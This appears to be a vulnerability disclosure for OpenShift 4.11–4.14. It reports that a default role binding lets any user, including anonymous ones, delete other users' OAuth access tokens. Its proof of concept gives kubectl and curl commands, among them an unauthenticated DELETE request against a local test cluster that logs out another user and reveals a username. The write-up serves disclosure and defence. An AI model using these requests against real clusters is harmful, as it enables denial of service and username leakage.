# openshift-oauthaccesstokens
## Description
In the current version of Openshift, 4.14, and back to at least 4.11, *all* users, including `system:anonymous `get the permission to delete any instance of the resource `oauthaccesstokens`. This allows any user that can list the resource `oauthaccesstokens` to force logout all other users, which can lead to a Denial of Service. 

Since the user `system:anonymous`, by default, also gets the permission to delete `oauthaccesstokens`, if the kubernetes API is publicly exposed, anyone could force logout users on the cluster, however, exploitation is less viable here since `system:anonymous` cannot list `oauthaccesstokens`.

Successfully deleting an `oauthaccesstoken` through the kubernetes API also leaks the username for whom the `oauthaccesstoken` was.

This permission is given to all users through the `clusterrole` `system:oauth-token-deleter`:
```powershell
PS > kubectl get clusterroles system:oauth-token-deleter -oyaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  annotations:
    rbac.authorization.kubernetes.io/autoupdate: "true"
  creationTimestamp: "2023-11-22T01:36:07Z"
  name: system:oauth-token-deleter
  resourceVersion: "8425"
  uid: 0fd49273-2c6b-4a0a-a8ab-735be5b01f2e
rules:
- apiGroups:
  - ""
  - oauth.openshift.io
  resources:
  - oauthaccesstokens
  - oauthauthorizetokens
  verbs:
  - delete
```

Which in turn is bound to `system:authenticated` and `system:unauthenticated` through the `clusterrolebinding` `system:oauth-token-deleters` : 

```powershell
PS > kubectl get clusterrolebinding system:oauth-token-deleters -oyaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  annotations:
    rbac.authorization.kubernetes.io/autoupdate: "true"
  creationTimestamp: "2023-11-22T01:36:08Z"
  name: system:oauth-token-deleters
  resourceVersion: "8477"
  uid: 6cbb646c-2836-4e7e-a08a-551c093a268e
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: system:oauth-token-deleter
subjects:
- apiGroup: rbac.authorization.k8s.io
  kind: Group
  name: system:authenticated
- apiGroup: rbac.authorization.k8s.io
  kind: Group
  name: system:unauthenticated
```

From a security perspective, by default, it should not be possible for any user to delete the `oauthaccesstoken` of another user.
It should definitely not be the default for e.g. `system:anonymous` or `system:unauthenticated` to have write access to resources, especially to delete any `oauthaccesstoken`.

This behavior seems to be correctly implemented through the clusterresource `useroauthaccesstokens` where you can't see or delete the accesstokens for another user, nor can an unauthenticated user see delete the tokens.
## Tested versions
Tested on Openshift versions:
- 4.11 (https://www.redhat.com/en/interactive-labs/openshift)
- 4.12 (production clusters on openstack)
- 4.14 (local openshift cluster)
The proof of concept below works on all the above versions.

## Proof of Concept
All commands below were executed against a local deployment of Openshift:
```powershell
PS > curl https://api.crc.testing:6443/version -k -H "Authorization: Bearer $TOKEN"
{
  "major": "1",
  "minor": "27",
  "gitVersion": "v1.27.6+b49f9d1",
  "gitCommit": "f3ec0ed759cde48849b6e3117c091b7db90c95fa",
  "gitTreeState": "clean",
  "buildDate": "2023-11-08T18:57:38Z",
  "goVersion": "go1.20.10 X:strictfipsruntime",
  "compiler": "gc",
  "platform": "linux/amd64"
}
```

Using `kubectl` the `kubeadmin` user, as well as `system:anonymous`, as `system:unauthenticated` have the permission to delete `oauthaccesstokens`: 

```powershell
PS > oc login -u kubeadmin https://api.crc.testing:6443

PS > kubectl auth can-i delete oauthaccesstokens
Warning: resource 'oauthaccesstokens' is not namespace scoped in group 'oauth.openshift.io'

yes

PS > kubectl auth can-i delete oauthaccesstokens --as=system:unauthenticated
Warning: resource 'oauthaccesstokens' is not namespace scoped in group 'oauth.openshift.io'

yes

PS > kubectl auth can-i delete oauthaccesstokens --as=system:anonymous
yes
```

Using the kubernetes API, we can, without authentication, delete the `oauthaccesstoken` for e.g. `kubeadmin`:

```powershell
PS > kubectl get oauthaccesstokens
NAME                                                 USER NAME   CLIENT NAME                    CREATED   EXPIRES                         REDIRECT URI                                                    SCOPES
sha256~LR7jgWOXifItKnPJX0Z10vJTm-jco2Nn-jsA-hHId-0   kubeadmin   openshift-challenging-client   10m       2023-12-08 08:17:11 +0000 UTC   https://oauth-openshift.apps-crc.testing/oauth/token/implicit   user:full
sha256~VFpOILn8edFxQXqZX3LsYQuk69kO419VUUkD5E5qb4k   developer   openshift-challenging-client   10m       2023-12-08 08:17:12 +0000 UTC   https://oauth-openshift.apps-crc.testing/oauth/token/implicit   user:full

PS > curl https://api.crc.testing:6443/apis/oauth.openshift.io/v1/oauthaccesstokens/sha256~VFpOILn8edFxQXqZX3LsYQuk69kO419VUUkD5E5qb4k -XDELETE -k
{
  "kind": "OAuthAccessToken",
  "apiVersion": "oauth.openshift.io/v1",
  "metadata": {
    "name": "sha256~VFpOILn8edFxQXqZX3LsYQuk69kO419VUUkD5E5qb4k",
    "uid": "49eecfde-84c3-43bb-8e88-fedf3ccd4a6e",
    "resourceVersion": "35718",
    "creationTimestamp": "2023-12-07T08:17:12xZ",
    "managedFields": [
      {
        "manager": "oauth-server",
        "operation": "Update",
        "apiVersion": "oauth.openshift.io/v1",
        "time": "2023-12-07T08:17:12Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:authorizeToken": {},
          "f:clientName": {},
          "f:expiresIn": {},
          "f:redirectURI": {},
          "f:scopes": {},
          "f:userName": {},
          "f:userUID": {}
        }
      }
    ]
  },
  "clientName": "openshift-challenging-client",
  "expiresIn": 86400,
  "scopes": [
    "user:full"
  ],
  "redirectURI": "https://oauth-openshift.apps-crc.testing/oauth/token/implicit",
  "userName": "developer",
  "userUID": "06ff3300-d689-4974-afae-68ea2d4a3921",
  "authorizeToken": "sha256~mIhDukLS7IIBdaSlyeCdCbga7mS2_WhArEdWgSuToVs"
}

PS > kubectl get oauthaccesstokens
NAME                                                 USER NAME   CLIENT NAME                    CREATED   EXPIRES                         REDIRECT URI                                                    SCOPES
sha256~LR7jgWOXifItKnPJX0Z10vJTm-jco2Nn-jsA-hHId-0   kubeadmin   openshift-challenging-client   11m       2023-12-08 08:17:11 +0000 UTC   https://oauth-openshift.apps-crc.testing/oauth/token/implicit   user:full
```





